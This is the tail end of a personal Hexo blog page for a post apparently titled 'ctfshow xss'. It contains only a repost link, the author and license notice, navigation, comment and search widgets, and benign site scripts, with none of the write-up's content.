+<p>转载：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_56815564/article/details/131563596">https://blog.csdn.net/qq_56815564/article/details/131563596</a></p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinsey973.github.io/2025/04/22/ctfshow-xss/" title="ctfshow xss">https://kinsey973.github.io/2025/04/22/ctfshow-xss/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/05/06/crypto-suanfa/" rel="prev" title="crypto-suanfa"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">crypto-suanfa</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/20/re/" rel="next" title="re"><span class="post-nav-text">re</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinsey973/kinsey973.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2025/04/22/ctfshow-xss/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinsey973" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script></body></html>
